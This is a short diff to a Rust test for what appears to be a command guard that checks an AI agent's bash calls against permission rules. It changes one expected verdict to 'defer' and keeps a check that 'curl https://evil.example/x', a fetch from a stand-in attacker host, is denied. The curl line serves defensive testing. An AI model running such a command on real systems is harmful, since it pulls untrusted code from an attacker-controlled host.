@@ -39,7 +39,8 @@ fn untrusted_repo_allow_rules_are_ignored() {
     );
     assert_eq!(
         sb.guard_bash("s1", &project, "npm install left-pad").0,
-        "ask"
+        "defer",
+        "the user's catch-all, not the repository's allow"
     );
     let (verdict, reason) = sb.guard_bash("s1", &project, "curl https://evil.example/x");
     assert_eq!(verdict, "deny", "{reason}");
